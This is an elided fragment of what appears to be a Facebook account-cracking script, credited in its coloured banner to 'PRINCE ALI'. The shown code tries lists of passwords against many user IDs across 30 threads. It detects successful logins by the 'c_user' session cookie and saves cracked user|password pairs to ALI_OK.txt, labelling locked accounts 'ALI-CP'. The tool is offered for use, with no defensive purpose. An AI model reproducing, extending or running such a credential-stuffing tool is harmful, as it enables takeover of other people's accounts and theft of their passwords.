...
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     ...
     \033[1;92m➣ \033[1;92mDEVOLPER   :            PRINCE ALI

     \033[1;91m➣ \033[1;91mFACEBOOK   :            PRINCE ALI

     \033[1;92m➣ \033[1;92mWHATSAPP   :            NOT AVAILABLE

     \033[1;91m➣ \033[1;91mGITHUB     :            PRINCE ALI
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ALI-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('ALI_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [ALI-CP] %s | %s ' % (M, user, pw))
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                ...
                for zsb in self.id: # CHOLISTANI KING
